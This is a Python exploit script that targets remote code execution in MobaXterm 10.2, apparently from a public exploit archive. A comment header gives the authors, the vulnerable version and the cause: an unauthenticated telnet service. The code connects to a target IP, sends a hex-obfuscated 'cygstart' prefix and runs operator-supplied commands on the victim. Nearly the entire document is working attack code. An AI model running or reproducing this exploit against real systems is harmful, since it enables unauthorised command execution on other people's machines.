import telnetlib,sys

# Exploit Title: MobaXtrem 10.2 Remote Code Execution
# Date: 20/May/2017
# Exploit Author: Sultan Albalawi & Chaitanya[@bofheaded]
# Vendor Homepage: http://mobatek.net
# Software Link: http://download.mobatek.net/10220170312132617/MobaXterm_Portable_v10.2.zip
# Version: 10.2
# Tested on: Windows Xp & Windows 7
# POC : https://youtu.be/Y8AcXDQgnAI

# Vulnerability Cause:::
# Telnet service doesn't authinticate for remote conncection which allows attacker to
# pass malicious commands over victim box through protocol. 

print """
Exploit => MobaXtrem 10.2 Remote Code Execution
Discoverer => Sultan Albalawi
Exploit Author => @bofheaded
https://hackinguyz.blogspot.com
"""
def get_set(HOST,cmd):
		try :
			tn = telnetlib.Telnet(HOST)
			bg="\x63\x79\x67\x73\x74\x61\x72\x74"
			tn.write(bg+" ./"+cmd+"\n")
			tn.write(main())
			tn.read_all()
		except KeyboardInterrupt:
			print "[-] Execution stopped ... keyboard interrupt raised"
		except Exception as e:
			pass 		
def main():
		if len(sys.argv)==2:
			HOST = sys.argv[1]
			cmd = str(raw_input("cmd> "))
			if "exit" in cmd :
				sys.exit("exiting...")
			else:
				print"Executing => %s"%cmd
				get_set(HOST,cmd)
		else:
			print "Usage: ./"+sys.argv[0]+" <target_ip>"		
if __name__ == '__main__':
			main()		